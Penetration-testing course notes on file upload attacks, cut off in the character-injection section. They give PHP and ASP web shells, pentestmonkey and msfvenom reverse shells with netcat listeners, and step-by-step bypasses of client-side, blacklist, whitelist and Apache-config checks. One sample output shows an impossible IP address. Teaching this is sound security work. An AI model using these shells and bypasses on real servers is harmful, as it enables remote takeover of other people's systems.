# File Upload Attacks — Complete Detailed Notes

---

## Table of Contents

1. [Intro to File Upload Attacks](#intro-to-file-upload-attacks)
   - [Types of File Upload Attacks](#types-of-file-upload-attacks)
2. [Absent Validation](#absent-validation)
   - [Arbitrary File Upload](#arbitrary-file-upload)
   - [Identifying Web Framework](#identifying-web-framework)
   - [Vulnerability Identification](#vulnerability-identification)
3. [Upload Exploitation](#upload-exploitation)
   - [Web Shells](#web-shells)
   - [Writing Custom Web Shell](#writing-custom-web-shell)
   - [Reverse Shell](#reverse-shell)
   - [Generating Custom Reverse Shell Scripts](#generating-custom-reverse-shell-scripts)
4. [Client-Side Validation](#client-side-validation)
   - [Back-end Request Modification](#back-end-request-modification)
   - [Disabling Front-end Validation](#disabling-front-end-validation)
5. [Blacklist Filters](#blacklist-filters)
   - [Blacklisting Extensions](#blacklisting-extensions)
   - [Fuzzing Extensions](#fuzzing-extensions)
   - [Non-Blacklisted Extensions](#non-blacklisted-extensions)
6. [Whitelist Filters](#whitelist-filters)
   - [Whitelisting Extensions](#whitelisting-extensions)
   - [Double Extensions](#double-extensions)
   - [Reverse Double Extension](#reverse-double-extension)
   - [Character Injection](#character-injection)
7. [Type Filters](#type-filters)
   - [Content-Type](#content-type)
   - [MIME-Type](#mime-type)
8. [Limited File Uploads](#limited-file-uploads)
   - [XSS](#xss)
   - [XXE](#xxe)
   - [DoS](#dos)
9. [Other Upload Attacks](#other-upload-attacks)
   - [Injections in File Name](#injections-in-file-name)
   - [Upload Directory Disclosure](#upload-directory-disclosure)
   - [Windows-specific Attacks](#windows-specific-attacks)
   - [Advanced File Upload Attacks](#advanced-file-upload-attacks)

---

## Intro to File Upload Attacks

Uploading user files has become a key feature for most modern web applications to allow the extensibility of web applications with user information. A social media website allows the upload of user profile images and other social media, while a corporate website may allow users to upload PDFs and other documents for corporate use. This feature is practically ubiquitous across the modern web — from profile pictures, to document submissions, to media sharing.

However, as web application developers enable this feature, they also take the risk of allowing end-users to store their potentially malicious data on the web application's back-end server. If the user input and uploaded files are not correctly filtered and validated, attackers may be able to exploit the file upload feature to perform malicious activities, like executing arbitrary commands on the back-end server to take control over it. The file upload mechanism itself becomes the attack vector.

File upload vulnerabilities are amongst the most common vulnerabilities found in web and mobile applications, as evidenced by the latest CVE (Common Vulnerabilities and Exposures) Reports. These vulnerabilities consistently appear in real-world applications across all industries and technology stacks. Most of these vulnerabilities are scored as **High** or **Critical** severity, showing the level of risk caused by insecure file upload implementation.

The core problem is a trust issue: the application accepts a file from the user and stores or processes it without adequately verifying that the file is what it claims to be or that it is safe. Once an attacker can upload an arbitrary file — especially a server-side executable — the consequences can include full server compromise, lateral movement to other systems, data theft, and persistent backdoor access.

---

### Types of File Upload Attacks

The most common reason behind file upload vulnerabilities is **weak file validation and verification**, which may not be well secured to prevent unwanted file types or could be missing altogether. Validation may be absent entirely, implemented only on the client-side (bypassed trivially), or implemented poorly on the back-end using insecure blacklists or regex patterns.

The worst possible kind of file upload vulnerability is an **unauthenticated arbitrary file upload** vulnerability. With this type of vulnerability, a web application allows any unauthenticated user to upload any file type, making it one step away from allowing any user to execute code on the back-end server. No login is required, and no restrictions are in place — the attacker simply uploads and executes.

Many web developers employ various types of tests to validate the extension or content of the uploaded file. However, if these filters are not secure, we may be able to bypass them and still reach arbitrary file uploads to perform our attacks. As we will explore throughout this module, filters can be bypassed via extension manipulation, encoding, MIME spoofing, double extensions, and more.

**The most common and critical attack** caused by arbitrary file uploads is **gaining remote command execution (RCE)** over the back-end server by:
- Uploading a **web shell** — a script that accepts and executes system commands via the browser
- Uploading a **reverse shell script** — a script that initiates a connection back to the attacker's machine

Even when arbitrary uploads are not possible and only specific file types are allowed, there are still various attacks achievable when certain security protections are missing from the web application:

- **XSS (Cross-Site Scripting)** — Injecting JavaScript into uploadable files (SVG, HTML, image metadata) to attack users who view those files
- **XXE (XML External Entity)** — Injecting malicious XML into SVG, PDF, or document files to read server files or perform SSRF
- **Denial of Service (DoS)** — Uploading decompression bombs, pixel flood images, or oversized files to crash the server
- **Overwriting critical system files and configurations** — Using directory traversal in file names or Windows 8.3 naming to overwrite sensitive files

Finally, a file upload vulnerability is not only caused by writing insecure functions but is also often caused by the **use of outdated libraries** that may be vulnerable to these attacks. At the end of the module, we will go through various tips and practices to secure web applications against the most common types of file upload attacks, in addition to further recommendations to prevent file upload vulnerabilities that we may miss.

---

## Absent Validation

The most basic type of file upload vulnerability occurs when the web application does not have **any form of validation filters** on the uploaded files, allowing the upload of any file type by default. There is no check on the file extension, file content, file size, or MIME type — the server blindly accepts and stores whatever is sent to it.

With these types of vulnerable web apps, we may directly upload our web shell or reverse shell script to the web application, and then by just visiting the uploaded script, we can interact with our web shell or send the reverse shell. There is no bypass required because there is nothing to bypass — the lack of any validation is the vulnerability itself.

This is the simplest and most severe form of file upload vulnerability. In real-world penetration tests, these are increasingly rare since modern frameworks and security awareness have improved, but they still exist — especially in older, legacy, or poorly maintained applications. When found, exploitation is direct and immediate.

---

### Arbitrary File Upload

Consider an **Employee File Manager** web application that allows users to upload personal files. The upload interface accepts files via drag-and-drop or a file selection dialog. Critically:

- The web application does not mention anything about what file types are allowed
- The file selection dialog says **"All Files"** for the file type — meaning no front-end restriction is specified
- A `.php` file can be selected and its name appears in the upload form without any warning or rejection
- Clicking "Upload" successfully uploads the file

All of these indicators tell us that the program appears to have **no file type restrictions on the front-end**, and if no restrictions were specified on the back-end either, we may be able to upload arbitrary file types to the back-end server to gain complete control over it. The combination of no front-end restriction and no back-end restriction creates a completely open upload surface.

---

### Identifying Web Framework

Before uploading a malicious script, we need to identify what **programming language and framework** the web server runs. A web shell must be written in the **same language as the web server** because it relies on that language's built-in functions (like `system()` in PHP) to execute OS commands. A PHP web shell will not work on an ASP.NET server, and vice versa — web shells are platform-specific scripts, not cross-platform tools.

**Method 1 — Check the URL extension:**
The simplest method is to observe the URL of the web page. If the URL ends in `.php`, `.asp`, `.aspx`, `.jsp`, etc., that tells us the language. However, many modern frameworks use **URL routing** (mapping URLs to handlers without showing extensions), so the extension may not be visible.

**Method 2 — Visit /index.ext manually:**
We can visit `http://SERVER_IP:PORT/index.php`, `http://SERVER_IP:PORT/index.asp`, `http://SERVER_IP:PORT/index.aspx`, etc., and see which one returns the same page (indicating it's the real index file). This is a quick manual fingerprinting technique.

For example, visiting `http://SERVER_IP:PORT/index.php` returns the same page as `http://SERVER_IP:PORT/` — confirming this is a PHP application.

We do not need to do this manually; we can use **Burp Intruder** to fuzz the file extension automatically using a **Web Extensions wordlist**, trying dozens of extensions quickly and seeing which returns a valid response.

**Method 3 — Wappalyzer browser extension:**
Wappalyzer is a browser extension available for all major browsers (Chrome, Firefox) that automatically detects the technology stack of any website you visit. Clicking its icon shows:
- The server-side language (e.g., PHP)
- The web server type and version (e.g., Apache 2.4)
- The operating system (e.g., Ubuntu)
- JavaScript libraries (e.g., jQuery)
- CMS or framework (e.g., WordPress, Laravel)

This provides comprehensive fingerprinting in one click. It is an essential tool in a web penetration tester's arsenal. However, it is always better to know alternative manual methods as well, since automated tools can sometimes be wrong or incomplete.

**Method 4 — Web vulnerability scanners:**
Tools like **Burp Scanner**, **OWASP ZAP**, **Nikto**, or other web vulnerability assessment tools can scan a web application and identify its technology stack, exposed headers, cookies, and other fingerprinting signals. These scanners automate what would otherwise be a lengthy manual process.

Once the programming language is identified, we can upload a malicious script written in the same language to exploit the web application and gain remote control over the back-end server.

---

### Vulnerability Identification

After identifying the web framework (PHP in our example), the next step is to **confirm whether arbitrary file uploads are possible** by uploading a test script. Rather than immediately uploading a full web shell, we start with a simple proof-of-concept to confirm code execution.

**Test Script — PHP Hello World:**

Write `<?php echo "Hello HTB";?>` to a file called `test.php`:

```php
<?php echo "Hello HTB"; ?>
```

**What this does:**
- `<?php` — Opens a PHP code block
- `echo "Hello HTB";` — Outputs the string "Hello HTB" to the HTTP response
- `?>` — Closes the PHP code block

Upload `test.php` to the web application. If the upload succeeds (e.g., we see "File successfully uploaded"), it means the back-end has **no file validation whatsoever**.

**Visiting the uploaded file:**

```
http://SERVER_IP:PORT/uploads/test.php
```

If the page displays `Hello HTB`, it means the `echo` function was **executed** — PHP code ran on the back-end server. This is direct confirmation that:
1. The file was uploaded successfully
2. The file is stored in the `/uploads/` directory (or similar)
3. The file is accessible and executable via its URL
4. We have confirmed remote PHP code execution

If the file was not executed (but instead shown as source code), it would mean PHP execution is not enabled for the upload directory — even if the upload succeeded, we couldn't execute code. But if `Hello HTB` is printed, we have full PHP execution, and the next step is uploading a real web shell.

---

## Upload Exploitation

The final step in exploiting this web application is to upload the **malicious script** in the same language as the web application — either a web shell or a reverse shell script. Once we upload our malicious script and visit its link, we can interact with it to take control over the back-end server.

---

### Web Shells

A **web shell** is a script uploaded to a vulnerable web server that provides an attacker with the ability to execute OS commands through the web browser. The attacker sends an HTTP request containing the desired command, and the web shell executes it on the server and returns the output in the HTTP response — all through a normal web page.

We can find many excellent web shells online that provide useful features, like directory traversal or file transfer:

- **phpbash** — Provides a terminal-like, semi-interactive web shell for PHP. It mimics a real bash terminal in the browser, making enumeration intuitive and easy.
- **SecLists web shells** — SecLists (`/opt/useful/seclists/Web-Shells`) provides a collection of web shells for different frameworks and languages including PHP, ASP, ASPX, JSP, and others.

**Using phpbash:**

Upload `phpbash.php` through the vulnerable upload form, then navigate to its URL by clicking the Download/View button:

```
http://SERVER_IP:PORT/uploads/phpbash.php
```

This provides a terminal-like experience directly in the browser, showing the current user (`www-data`), UID, GID, and the current working directory. From here, we can run any Linux command: `ls`, `cat`, `whoami`, `uname -a`, `ifconfig`, etc. This is extremely useful for enumerating the back-end server for further exploitation — reading config files, finding credentials, identifying installed software, and mapping the network.

---

### Writing Custom Web Shell

Although using web shells from online resources provides a great experience, we must know how to write a simple web shell manually. This is because we may not have access to online tools during some penetration tests, so we need to be able to create one when needed. A custom web shell can also be adapted to bypass security controls that might block well-known web shell signatures.

**Custom PHP Web Shell:**

```php
<?php system($_REQUEST['cmd']); ?>
```

**Code Breakdown:**
- `<?php` — Opens the PHP code block
- `system()` — A built-in PHP function that executes the given command as if typed directly in a system shell (bash/sh on Linux, cmd.exe on Windows) and **prints the output** to the browser
- `$_REQUEST['cmd']` — Retrieves the value of the `cmd` parameter from either GET or POST request data. `$_REQUEST` is a PHP superglobal that combines `$_GET`, `$_POST`, and `$_COOKIE` — making the shell accessible via both GET and POST requests
- `?>` — Closes the PHP code block

**Writing the shell to a file:**

```bash
echo '<?php system($_REQUEST["cmd"]); ?>' > shell.php
```

Upload `shell.php` to the web application, then interact with it by appending `?cmd=<command>` to the URL:

```
http://SERVER_IP:PORT/uploads/shell.php?cmd=id
```

**How this works:**
- The browser sends a GET request to `/uploads/shell.php` with `cmd=id`
- PHP executes `system('id')` on the server
- The `id` command output (UID, GID, groups) is printed to the HTTP response and displayed in the browser

**Output Example:**

```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

**Tip:** When using this custom web shell in a browser, use **source-view** by clicking `CTRL+U`. The source view shows the command output as it would appear in a terminal, without HTML rendering that may format or mangle the output (especially useful for multi-line command output).

**Web shells are not exclusive to PHP.** The same concept applies to other frameworks with different syntax:

**ASP/.NET Web Shell:**

```asp
<% eval request('cmd') %>
```

**Code Breakdown:**
- `<%` — Opens an ASP/ASP.NET code block
- `eval` — Evaluates and executes the given expression as code
- `request('cmd')` — Retrieves the `cmd` parameter from the HTTP request
- `%>` — Closes the code block

This works identically to the PHP version — append `?cmd=whoami` to the URL and it executes the command and returns the output.

**Note:** In certain cases, web shells may not work. This may be due to the web server preventing the use of certain functions (e.g., `system()` may be disabled in `php.ini` via `disable_functions`), or due to a **Web Application Firewall (WAF)** blocking shell-like patterns. In these cases, more advanced techniques are needed to bypass these security mitigations.

---

### Reverse Shell

A **reverse shell** is a type of shell where the **target server initiates the connection back to the attacker's machine**, rather than the attacker connecting to the server. This is preferred over web shells because:
- It provides a fully interactive shell session (just like SSH)
- It bypasses inbound firewall rules (since the connection is outbound from the server's perspective)
- It allows running interactive programs and commands that require a TTY
- It is more powerful and flexible for post-exploitation

**Steps to obtain a reverse shell:**

**Step 1 — Download a reverse shell script:**

A reliable PHP reverse shell is the **pentestmonkey PHP reverse shell**. SecLists also contains reverse shell scripts for various languages and web frameworks. Download a reverse shell script for PHP.

**Step 2 — Configure the reverse shell with your IP and port:**

Open the script in a text editor and modify the connection parameters. For pentestmonkey, edit lines 49 and 50:

```php
$ip = 'OUR_IP';     // CHANGE THIS — your attacking machine's IP address
$port = OUR_PORT;   // CHANGE THIS — the port your listener will be on
```

Replace `OUR_IP` with your machine's actual IP address (e.g., `10.10.14.5`) and `OUR_PORT` with the port number you want to receive the connection on (e.g., `4444`).

**Step 3 — Start a netcat listener on your machine:**

```bash
nc -lvnp OUR_PORT
```

**Command Breakdown:**
- `nc` — Netcat, a versatile networking utility for reading and writing data across network connections
- `-l` — Listen mode: tells netcat to wait for incoming connections instead of initiating one
- `-v` — Verbose mode: displays connection details when a connection is made
- `-n` — Numeric only: disables DNS resolution (faster, no reverse DNS lookups)
- `-p OUR_PORT` — Specifies the port number to listen on (e.g., `-p 4444`)

The listener is now waiting. Any connection coming in on `OUR_PORT` will be caught and a shell session will be established.

**Step 4 — Upload the reverse shell and trigger it:**

Upload the modified reverse shell script via the vulnerable upload form, then navigate to its URL (click Download/View button). When PHP executes the script, it connects back to your netcat listener.

**Expected Output (on attacker machine):**

```bash
nc -lvnp OUR_PORT
listening on [any] OUR_PORT ...
connect to [OUR_IP] from (UNKNOWN) [188.166.173.208] 35232
# id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

We successfully received a connection back from the back-end server. We now have an interactive shell where we can type commands and get responses in real time — just like an SSH session. The same concept works for other web frameworks and languages, with the only difference being the reverse shell script used.

---

### Generating Custom Reverse Shell Scripts

While it is possible to use the same `system()` function and pass it a reverse shell command (like a bash one-liner), this may not always be reliable. The command may fail for various reasons — shell character encoding issues, restricted environments, missing utilities, etc. This is why it is always better to use **core web framework functions** to establish the connection, as they are more stable and reliable.

**Using msfvenom to generate reverse shells:**

`msfvenom` is Metasploit's payload generation tool. It can generate reverse shell scripts in many languages and may also attempt to bypass certain restrictions in place (e.g., obfuscation to avoid AV detection).

**Generate a PHP reverse shell:**

```bash
msfvenom -p php/reverse_php LHOST=OUR_IP LPORT=OUR_PORT -f raw > reverse.php
```

**Command Breakdown:**
- `msfvenom` — Metasploit's standalone payload generator tool (part of the Metasploit Framework)
- `-p php/reverse_php` — Specifies the payload to use. `php/reverse_php` is a PHP reverse TCP shell payload. The format is `language/payload_name`
- `LHOST=OUR_IP` — Sets the `LHOST` (Listener Host) option — your attacking machine's IP address that the reverse shell will connect back to
- `LPORT=OUR_PORT` — Sets the `LPORT` (Listener Port) option — the port on your machine that netcat is listening on
- `-f raw` — Specifies the output format. `raw` outputs the payload as plain PHP code without any encoding or wrapping
- `> reverse.php` — Redirects the generated payload output to a file named `reverse.php`

**Expected Output:**

```
...SNIP...
Payload size: 3033 bytes
```

The generated `reverse.php` file is a stable, reliable PHP reverse shell that uses PHP's native socket functions.

**Step 2 — Start a netcat listener and upload the generated shell:**

```bash
nc -lvnp OUR_PORT
```

Upload `reverse.php` via the vulnerable upload form, visit its URL, and the reverse shell connects back:

```bash
nc -lvnp OUR_PORT
listening on [any] OUR_PORT ...
connect to [OUR_IP] from (UNKNOWN) [181.151.182.286] 56232
# id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

**Generating reverse shells for other languages:**

`msfvenom` supports many payloads for different languages. Use the `-p` flag to specify the language/payload and the `-f` flag for the output format:

```bash
msfvenom -p asp/reverse_tcp LHOST=OUR_IP LPORT=OUR_PORT -f raw > reverse.asp
msfvenom -p java/jsp_shell_reverse_tcp LHOST=OUR_IP LPORT=OUR_PORT -f raw > reverse.jsp
msfvenom -p windows/shell_reverse_tcp LHOST=OUR_IP LPORT=OUR_PORT -f exe > reverse.exe
```

**Reverse shells vs. web shells:**

While **reverse shells are always preferred** over web shells (because they provide a fully interactive terminal session for controlling the compromised server), they may not always work. Reasons for failure include:
- A firewall on the back-end network blocking **outgoing connections**
- The web server having `disable_functions` set in `php.ini`, blocking socket-creation functions
- Strict egress filtering preventing the server from connecting to external IPs

In these cases, we fall back to web shells, which only require the server to respond to incoming HTTP requests (which are almost always allowed). The web shell operates within the existing HTTP channel rather than creating a new outbound connection.

---

## Client-Side Validation

Many web applications only rely on **front-end JavaScript code** to validate the selected file format before it is uploaded and would not upload it if the file is not in the required format (e.g., not an image). The validation logic runs entirely inside the user's browser — there is no server involvement until the actual upload request is sent.

However, since the file format validation is happening on the **client-side**, we can easily bypass it by:
1. **Directly modifying the HTTP upload request** to the server (bypassing the browser's validation logic entirely)
2. **Modifying the front-end code** through the browser's developer tools to disable or remove the validation function

Any code that runs on the client-side is under our complete control. While the web server is responsible for sending the front-end code, the rendering and execution of the front-end code happen within our browser — and we can change it. If the web application does not apply any validation on the back-end, we should be able to upload any file type once we bypass the client-side checks.

---

### Back-end Request Modification

When we examine the web application's normal behavior using Burp Suite, we can see that selecting and uploading an image sends a standard HTTP POST request to `/upload.php`. This request contains the file's name, content type, and the file data. The key insight is that **this request is entirely under our control** once we intercept it — the server receives what we send, regardless of what the browser's JavaScript would have validated.

**Intercepting and modifying the upload request in Burp Suite:**

1. Enable Burp Suite's proxy and intercept mode
2. Select a legitimate image file (e.g., `HTB.png`) in the upload form and click Upload
3. Burp intercepts the POST request — you can see fields like:
   - `filename="HTB.png"` — The file name sent to the server
   - `Content-Type: image/png` — The MIME type of the file
   - The raw file content (binary image data) at the bottom of the request body

**Modify the request:**
- Change `filename="HTB.png"` to `filename="shell.php"`
- Replace the image content with our PHP web shell: `<?php system($_REQUEST['cmd']); ?>`
- Forward the modified request to the server

The server receives a request claiming to upload `shell.php` with PHP web shell content. If the back-end does **not** validate the file type, it accepts and stores it.

**Result:**

```
File successfully uploaded
```

We bypassed the client-side validation completely by intercepting the request after the browser sent it (post-validation) and modifying it before it reached the server. Now we visit:

```
http://SERVER_IP:PORT/uploads/shell.php?cmd=id
```

And we have remote code execution.

**Note:** We may also modify the `Content-Type` of the uploaded file (e.g., change `image/png` to `application/x-php`). However, at this stage — when there is no back-end validation — this is not necessary. It becomes relevant when the server checks Content-Type headers as a validation mechanism (covered in Type Filters section).

---

### Disabling Front-end Validation

An alternative method to bypass client-side validations is to **directly manipulate the front-end code** in the browser's developer tools. Since all the validation is running in JavaScript within our browser, we can view, edit, and delete that JavaScript to remove the restrictions before uploading.

**Step 1 — Inspect the file input element:**

Press `CTRL+SHIFT+C` to toggle the browser's **Page Inspector** (Element Inspector). Click on the profile image / upload area to highlight the relevant HTML element. The file input element appears as:

```html
<input type="file" name="uploadFile" id="uploadFile" onchange="checkFile(this)" accept=".jpg,.jpeg,.png">
```

**Key attributes to note:**
- `accept=".jpg,.jpeg,.png"` — Restricts the file selection dialog to only show JPG and PNG files. This can be changed or removed to allow all file types in the dialog.
- `onchange="checkFile(this)"` — This is the critical attribute. Every time a file is selected, the JavaScript function `checkFile()` is called with the file input element as its argument. This function performs the validation.

**Step 2 — Examine the validation function:**

Press `CTRL+SHIFT+K` to open the browser **Console**. Type `checkFile` to view the function's code:

```javascript
function checkFile(File) {
...SNIP...
    if (extension !== 'jpg' && extension !== 'jpeg' && extension !== 'png') {
        $('#error_message').text("Only images are allowed!");
        File.form.reset();
        $("#submit").attr("disabled", true);
    ...SNIP...
    }
}
```

**What this function does:**
- Checks the extension of the selected file
- If the extension is NOT `.jpg`, `.jpeg`, or `.png`, it:
  - Displays the error message "Only images are allowed!"
  - Resets the form (clears the selected file)
  - Disables the Upload button (`disabled`, `true`)

This function runs client-side and is what prevents us from uploading `.php` files through the form normally.

**Step 3 — Remove the validation function:**

Go back to the Page Inspector, click on the profile image again to highlight the input element, then **double-click** on `checkFile` in the `onchange="checkFile(this)"` attribute and **delete it**. The attribute now reads:

```html
<input type="file" name="uploadFile" id="uploadFile" onchange="" accept=".jpg,.jpeg,.png">
```

Optionally, also remove `accept=".jpg,.jpeg,.png"` to make it easier to select `.php` files in the file dialog (though this is not mandatory — you can still select "All Files").

**Step 4 — Upload the web shell:**

Now select our `shell.php` file through the file dialog. Since the `checkFile` function no longer runs, no validation fires, no error message appears, and the Upload button remains enabled. Click Upload — the shell uploads successfully.

**Step 5 — Find the uploaded file path:**

Press `CTRL+SHIFT+C` (Page Inspector), click on the profile image, and look at the `src` attribute:

```html
<img src="/profile_images/shell.php" class="profile-image" id="profile-image">
```

This reveals the uploaded file path. Navigate to it:

```
http://SERVER_IP:PORT/profile_images/shell.php?cmd=id
```

Output:

```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

**Important Note:** The modification made to the source code is **temporary** and will not persist through page refreshes — we are only changing it on the client-side in memory. However, our only need is to bypass the client-side validation for the single upload action, so this is sufficient.

**Note:** The above steps apply to **Firefox**. Other browsers may have slightly different developer tools interfaces. For example, Chrome uses **Overrides** for persistent source changes, while in Firefox the changes take effect immediately in the current page session.

---

## Blacklist Filters

When client-side validation alone is insufficient, web applications implement **back-end validation** on the server. This ensures that even if an attacker bypasses the front-end, the server still enforces restrictions. There are two main forms of back-end extension validation:

1. **Blacklist-based validation** — Explicitly blocks specific file extensions (e.g., `.php`, `.exe`)
2. **Whitelist-based validation** — Only allows specific file extensions (e.g., `.jpg`, `.png`)

This section covers blacklist-based validation — its weaknesses and how to bypass it.

---

### Blacklisting Extensions

A **blacklist** is an array or list of extensions that are explicitly denied. Any extension not on the list is implicitly allowed. This approach is inherently flawed because it is virtually impossible to enumerate every dangerous extension — especially considering the many alternative extensions that PHP and other languages support.

**Example of a PHP blacklist implementation:**

```php
$fileName = basename($_FILES["uploadFile"]["name"]);
$extension = pathinfo($fileName, PATHINFO_EXTENSION);
$blacklist = array('php', 'php7', 'phps');

if (in_array($extension, $blacklist)) {
    echo "File type not allowed";
    die();
}
```

**Code Breakdown:**
- `$_FILES["uploadFile"]["name"]` — Gets the original name of the uploaded file from the HTTP request
- `basename()` — Returns only the filename part of a full path, stripping any directory components (prevents path traversal in the filename itself)
- `pathinfo($fileName, PATHINFO_EXTENSION)` — Extracts only the **file extension** from the filename. For `shell.php`, it returns `php`.
- `$blacklist = array('php', 'php7', 'phps')` — The blacklist array containing denied extensions
- `in_array($extension, $blacklist)` — Checks if the extracted extension exists in the blacklist array
- If the extension is found in the blacklist, it echoes "File type not allowed" and terminates with `die()`

**Critical Weakness of this approach:**
This blacklist only blocks three extensions (`php`, `php7`, `phps`). PHP has **many other valid extensions** that the server can still execute as PHP code — none of which are in this blacklist. An attacker only needs to find one extension not on the list.

**Additional Weakness — Case sensitivity:**
The comparison above is **case-sensitive** and only considers lowercase extensions. On **Windows servers**, file names are case-insensitive, so uploading `shell.pHp` or `shell.PHP` may bypass the blacklist (since the check looks for `php` exactly) while still being executed as PHP by the server.

---

### Fuzzing Extensions

To find which extensions bypass the blacklist, we use **Burp Suite Intruder** to fuzz the upload request with a comprehensive list of PHP-compatible extensions.

**Setting up the fuzz:**

1. Capture an upload request in Burp Suite History
2. Right-click the request → **Send to Intruder**
3. In the **Positions** tab: clear all automatic positions, then highlight `.php` in `filename="HTB.php"` and click **Add** to set it as the fuzzing position
4. Set the attack type to **Sniper** (one payload position, one wordlist)
5. In the **Payloads** tab: load the PHP extensions wordlist (from PayloadsAllTheThings or SecLists)
6. In the **Payloads** tab: **uncheck URL Encoding** — this prevents Burp from encoding the `.` (dot) before the extension, which would break the file extension
7. Click **Start Attack**

**Analyzing Results:**
- Sort results by **Length** (response content length)
- Responses with a consistent length (e.g., 193 bytes) and "File successfully uploaded" message indicate **allowed extensions** (not on the blacklist)
- Responses with a different length and "Extension not allowed" message indicate **blocked extensions**

**Extension wordlists from PayloadsAllTheThings (PHP extensions):**

Common PHP extensions that may bypass a basic blacklist:
`.php`, `.php2`, `.php3`, `.php4`, `.php5`, `.php6`, `.php7`, `.phps`, `.pht`, `.phtml`, `.pgif`, `.shtml`, `.phar`, `.inc`, `.hphp`, `.ctp`, `.module`

Many of these are recognized by Apache/Nginx as PHP files and executed as such, yet they are often overlooked in blacklists.

---

### Non-Blacklisted Extensions

After identifying which extensions are not blacklisted, we try uploading a PHP web shell using one of those allowed extensions. Not all extensions will work with all web server configurations, so we may need to try several until one successfully executes PHP code.

**Using `.phtml` extension (commonly allowed):**

`.phtml` is a PHP extension that many PHP-configured web servers execute as PHP code. It is often missing from basic blacklists because developers focus on `.php` and forget about its variants.

**In Burp Repeater:**
1. Right-click on the `.phtml` request from Intruder results → **Send to Repeater**
2. In Repeater: change `filename="HTB.phtml"` and replace the file content with our PHP web shell: `<?php system($_REQUEST['cmd']); ?>`
3. Send the request

**Expected Response:**

```
File successfully uploaded
```

**Visit the uploaded file:**

```
http://SERVER_IP:PORT/profile_images/shell.phtml?cmd=id
```

**Output:**

```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

We successfully bypassed the blacklist by using `.phtml` — an extension not on the blacklist — and confirmed PHP code execution. The approach: blacklists are inherently incomplete; find the gap.

---

## Whitelist Filters

A **whitelist** is generally more secure than a blacklist. Instead of blocking known-bad extensions, it only **allows known-good extensions**. Any extension not on the whitelist is implicitly denied. This is more secure because the developer only needs to define what is allowed, not anticipate every possible dangerous extension.

**When to use each:**
- **Blacklist** — More suitable when the upload functionality needs to accept a wide variety of file types (e.g., a general file manager). The developer blocks specific dangerous types while allowing most others.
- **Whitelist** — More suitable when only a narrow set of file types is needed (e.g., profile picture upload accepting only images). Only a few extensions are allowed.
- Both may be used together for layered defense.

---

### Whitelisting Extensions

**Example of a PHP whitelist implementation (with a flaw):**

```php
$fileName = basename($_FILES["uploadFile"]["name"]);

if (!preg_match('^.*\.(jpg|jpeg|png|gif)', $fileName)) {
    echo "Only images are allowed";
    die();
}
```

**Code Breakdown:**
- `preg_match('^.*\.(jpg|jpeg|png|gif)', $fileName)` — Uses a **regular expression (regex)** to test if the filename matches the pattern
- `^.*\.` — Matches the start of the string (`^`), then any characters (`.*`), then a literal dot (`\.`)
- `(jpg|jpeg|png|gif)` — After the dot, one of these four extensions must follow
- The `!` negates the result — if the pattern does NOT match, the upload is blocked
- The critical flaw: **there is no `$` at the end of the regex**. Without the end-of-string anchor `$`, the regex only checks that the filename **contains** the extension somewhere, not that it **ends** with it

**The Flaw:** A filename like `shell.php.jpg` matches the regex because it **contains** `.jpg`. The regex finds `.jpg` in the middle of the string and considers it a match, even though the file ends in `.php`.

---

### Double Extensions

The **Double Extension** technique exploits the flaw in regex-based whitelist validation where the pattern checks for the presence of an allowed extension anywhere in the filename rather than at the end.

**Attack:** Name the file using both the allowed extension and our malicious extension, in the format `shell.jpg.php`:
- The regex pattern finds `.jpg` → match → upload is allowed
- The actual final extension is `.php` → server executes it as PHP

**Modifying the upload request in Burp:**
- Change `filename="HTB.png"` to `filename="shell.jpg.php"`
- Replace file content with the PHP web shell

**Result:** File successfully uploaded.

**Visit the shell:**

```
http://SERVER_IP:PORT/profile_images/shell.jpg.php?cmd=id
```

**Output:**

```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

**However**, this technique does NOT work against a properly anchored regex like:

```php
if (!preg_match('/^.*\.(jpg|jpeg|png|gif)$/', $fileName)) { ...SNIP... }
```

Here, the `$` at the end means the extension must be at the **very end** of the filename. `shell.jpg.php` ends in `.php` — not in `.jpg` — so the regex does not match and the file is blocked. In this case, we need other techniques like **Reverse Double Extension** or **Character Injection**.

---

### Reverse Double Extension

The **Reverse Double Extension** technique targets a **server-side misconfiguration** rather than the upload form's validation. Even if the upload form has a perfect whitelist (only allowing files ending in `.jpg`), the web server itself may be misconfigured to execute PHP in any file that merely **contains** a PHP extension.

**Example of a vulnerable Apache configuration (`/etc/apache2/mods-enabled/php7.4.conf`):**

```xml
<FilesMatch ".+\.ph(ar|p|tml)">
    SetHandler application/x-httpd-php
</FilesMatch>
```

**Configuration Breakdown:**
- `<FilesMatch>` — An Apache directive that matches files by name using a regex
- `.+\.ph(ar|p|tml)` — Matches any file whose name contains `.phar`, `.php`, or `.phtml` **anywhere** in the filename
- `SetHandler application/x-httpd-php` — Tells Apache to handle matching files as PHP — meaning PHP code within them will be executed

**The Flaw:** Just like the upload form's bad regex, this Apache config has **no `$` anchor**. It checks if the filename **contains** `.php` (or `.phar`, `.phtml`) — not if it **ends** with it. So a file named `shell.php.jpg`:
- **Passes the whitelist** — ends in `.jpg` ✅
- **Executes as PHP** — contains `.php` → Apache's `FilesMatch` triggers → PHP executed ✅

**Attack:** Upload a file named `shell.php.jpg`:
- The whitelist check: filename ends in `.jpg` → passes ✅
- Apache's PHP handler: filename contains `.php` → executes as PHP ✅
- Our PHP web shell code inside the file gets executed

**Modifying the upload request:**
- Change `filename="HTB.jpg"` to `filename="shell.php.jpg"`
- Replace file content with the PHP web shell

**Visit the shell:**

```
http://SERVER_IP:PORT/profile_images/shell.php.jpg?cmd=id
```

**Output:**

```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

We bypassed the strict whitelist test and exploited the web server misconfiguration to execute PHP code and gain control over the server.

**Exercise Note:** The web application may use a blacklist alongside the whitelist. Try fuzzing with the PHP Wordlist to see which extensions are blacklisted. Combine blacklist bypass techniques if necessary.

---

### Character Injection

**Character Injection** is a technique to bypass whitelist validation by injecting special characters into the filename that cause the web application or web server to **misinterpret the file extension**. The injected character tricks the parser into reading only part of the filename when determining the extension — causing the stored file to have a different extension than what appears in the request.

**Characters to try injecting:**

| Character | URL Encoded | Use Case |
|---|---|---|
| Space | `%20` | May cause the filename to be truncated at the space |
| Newline | `%0a` | Line feed may terminate string parsing |
| Null byte | `%00` | Terminates string in C-based functions (PHP < 5.5) |
